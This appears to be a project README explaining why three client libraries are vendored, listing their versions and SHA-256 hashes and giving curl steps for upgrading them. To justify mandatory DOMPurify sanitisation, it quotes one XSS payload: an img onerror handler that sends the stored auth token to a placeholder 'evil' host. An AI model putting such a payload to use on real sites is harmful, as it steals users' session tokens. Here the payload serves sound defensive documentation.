# Vendored client libraries

These files are **committed deliberately**. cmux-remote has no `package.json` dependencies and
must start from a clean checkout with plain `node server.js` — no `npm install`, no
`node_modules`. Vendoring the browser-side libraries as static assets keeps that promise while
still giving the Files viewer real markdown rendering and syntax highlighting.

They are served by `server.js`'s `/vendor/` route and precached by the service worker, so a phone
downloads them once.

| File | Package | Version | SHA-256 | Source |
|---|---|---|---|---|
| `marked.min.js` | marked | 15.0.12 | `3e7e7d7feb3e5d58cb6c804f68ab5c24cc7e5eb6270fd6e5cbb9124739217d0c` | `https://cdn.jsdelivr.net/npm/marked/marked.min.js` |
| `purify.min.js` | dompurify | 3.4.12 | `c45ba939765574f96cbf35ee9b6d89f73756a17921814425e74b82f7c54603ce` | `https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js` |
| `highlight.min.js` | @highlightjs/cdn-assets | 11.11.1 | `c4a399dd6f488bc97a3546e3476747b3e714c99c57b9473154c6fb8d259b9381` | `https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js` |
| `highlight.min.css` | @highlightjs/cdn-assets | 11.11.1 (github-dark) | `9f208d022102b1d0c7aebfecd8e42ca7997d5de636649d2b31ea63093d809019` | `https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/styles/github-dark.min.css` |

Vendored 2026-07-27.

## Why DOMPurify is not optional

`marked` passes raw HTML through by design. The viewer renders into the same origin that holds
`SERVER_TOKEN` in `localStorage`, so a markdown file containing
`<img src=x onerror="fetch('https://evil/?t='+localStorage.cmux_token)">` would exfiltrate the
token that gates the whole UI. Rendered markdown therefore always goes
`marked.parse()` → `DOMPurify.sanitize()` → `innerHTML`, in that order. Code and raw markdown are
inserted with `textContent` and never touch `innerHTML` at all.

## Upgrading

Re-run the fetches, then update the version and SHA-256 columns above:

```bash
cd public/vendor
curl -fsSLo marked.min.js     https://cdn.jsdelivr.net/npm/marked/marked.min.js
curl -fsSLo purify.min.js     https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js
curl -fsSLo highlight.min.js  https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js
curl -fsSLo highlight.min.css https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/styles/github-dark.min.css
shasum -a 256 *
```

Note: `marked` 16+ changed its published build layout and no longer ships `marked.min.js` at that
path — the unversioned URL above resolves to the 15.x line. Moving to 18.x means switching to the
UMD bundle path and re-testing table rendering before committing.

After upgrading, bump the `?v=` cache-buster in `public/index.html` so phones pick up the change,
and re-run the XSS assertion in `test/p4-files-smoke.mjs`.
